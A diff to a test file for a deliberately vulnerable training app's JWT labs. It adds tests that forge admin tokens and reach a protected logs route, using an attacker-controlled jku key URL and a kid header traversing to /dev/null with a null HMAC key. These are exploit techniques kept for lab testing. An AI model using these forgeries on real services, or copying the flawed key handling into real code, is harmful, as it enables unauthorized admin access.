@@ -36,17 +36,17 @@ describe('JWT key handling labs', function () {
     jwksServer.close(done);
   });
 
-  it('accepts an RS256 token using the public key at its jku URL', async function () {
-    const token = jwt.sign({ sub: 'admin@dvws.local' }, privateKey, {
+  it('accepts an attacker-signed RS256 token through shared auth and reaches a protected app route', async function () {
+    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, privateKey, {
       algorithm: 'RS256',
+      issuer: 'https://github.com/snoopysecurity',
       header: { jku: jwksUrl, kid: 'test-key' }
     });
-    const response = await request.get('/api/v2/jwt-key-lab/jku/profile')
+    const response = await request.get('/api/v2/admin/logs')
       .set('Authorization', `Bearer ${token}`);
 
     assert.strictEqual(response.status, 200);
-    assert.strictEqual(response.body.profile.email, 'admin@dvws.local');
-    assert.strictEqual(response.body.authenticatedAs, 'admin@dvws.local');
+    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
   });
 
   it('accepts an HS256 token after kid traverses to /dev/null', async function () {
@@ -60,5 +60,17 @@ describe('JWT key handling labs', function () {
     assert.strictEqual(response.status, 200);
     assert.strictEqual(response.body.profile.email, 'admin@dvws.local');
     assert.strictEqual(response.body.authenticatedAs, 'admin@dvws.local');
+  });
+
+  it('uses kid traversal to forge a token accepted by a protected application endpoint', async function () {
+    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, Buffer.from([0]), {
+      algorithm: 'HS256',
+      header: { kid: '../../../../../../dev/null' }
+    });
+    const response = await request.get('/api/v2/admin/logs')
+      .set('Authorization', `Bearer ${token}`);
+
+    assert.strictEqual(response.status, 200);
+    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
   });
 });
